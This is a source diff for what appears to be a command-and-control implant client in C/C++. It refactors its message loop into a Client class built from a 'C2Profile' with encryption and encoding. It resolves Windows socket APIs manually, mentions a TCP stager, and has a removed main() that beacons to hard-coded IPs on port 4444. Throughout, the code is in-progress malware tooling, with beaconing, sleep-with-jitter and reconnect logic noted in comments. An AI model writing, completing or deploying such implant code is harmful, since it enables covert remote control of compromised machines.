@@ -19,53 +19,41 @@
 #include "../utils/ministd.h"
 
 #include "MessageConsumer.h"
+#include "Client.h"
 
-#include "logging.h"
-
-
-
-//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
-int receiveMessages(uint8_t* buffer, size_t bytes_received, Config* config)
-{
-	// TODO: replace 'true' with a condition
-	while (true) // TODO: change to var... while tcp connection is valid/established/successful
-	{
-		// TODO: socket stuff
-
-		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
-		// if there's incoming commands...
-
-		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
-		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
-		// and is a valid MessageType and what not
-		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
-		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
-
-        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
-		handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
-
-        send(&resultMsg, config); // TODO: check return value for errors
+#include "../common/logging.h"
 
 
 
-        // if heartbeat interval elapsed... 
-        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?
-
-		// sleepWithJitter()
-
-		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
-	}
-
-	return 0; // if no errors, return 0
-}
 	
 
 
-int run(const char* host, const char* port)
+
+Client::Client(C2Profile config) : 
+	encryptorPtr_(std::make_unique<Encryptor>()),
+	encoderPtr_(std::make_unique<Encoder>()),
+	serializerPtr_(std::make_unique<Serializer>())
+	//configPtr_(std::make_unique<C2Profile>()),
+	//config_(config),
+{
+	encryptorPtr_->setKey(config.getCryptoKey());
+	encryptorPtr_->setAlgorithm(config.getEncryptionAlgorithm());
+	//encoderPtr_->setKey(config.getCryptoKey());
+	//encoderPtr_->setAlgorithm(config.getEncryptionAlgorithm());
+	//serializerPtr_->setKey(config.getCryptoKey());
+	//serializerPtr_->setAlgorithm(config.getEncryptionAlgorithm());
+
+	messageConsumer_ = MessageConsumer(*encryptorPtr_, *encoderPtr_, *serializerPtr_);
+	messagePublisher_ = MessagePublisher(*encryptorPtr_, *encoderPtr_, *serializerPtr_);
+	messageHandler_ = MessageHandler(config); // config?
+
+}
+
+bool Client::run(const char* host, const char* port)
 {
 
 	//Config* config = loadConfig();
-	Config config = loadConfig();
+	//Config config = loadConfig();
 
     // 1. manually resolve apis
     /*
@@ -249,7 +237,9 @@ int run(const char* host, const char* port)
 
 	//////////////////////////////
 
-	receiveMessages(recvBuf, bytes_received, &config);
+	//receiveMessages(recvBuf, bytes_received, &config);
+
+	messageHandler_.receiveMessages(recvBuf, bytes_received);
 	
 
 	//////////////////////////////
@@ -323,36 +313,5 @@ int run(const char* host, const char* port)
     // DEBUG_PRINT("8 - Cleaning up"); 
     pCloseSocket(sock);
     pWSACleanup();
-    return 0;
+    return false;
 }
-
-Client::Client(Config config) : 
-	encryptorPtr_(std::make_unique<Encryptor>()),
-	encoderPtr_(std::make_unique<Encoder>()),
-	serializerPtr_(std::make_unique<Serializer>()),
-	messageConsumer_(*encryptorPtr_, *encoderPtr_, *serializerPtr_),
-	messagePublisher(*encryptorPtr_, *encoderPtr_, *serializerPtr_),
-	config_(config)
-{}
-
-
-int main()
-{
-    //Stager tcpStager;
-    //tcpStager.run("172.18.245.234", "4444");
-    //tcpStager.run("10.0.0.86", "4444");
-    const char server_ip[] = "127.0.0.1";
-    run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?
-    //run("172.18.245.234", "4444");
-    //run("10.0.0.86", "4444");
-
-	/* MainLoop: 
-	 * - setup socket
-	 * - connect to server
-	 * - client main loop
-	 * - close connection
-	 * */
-}
-
-
-
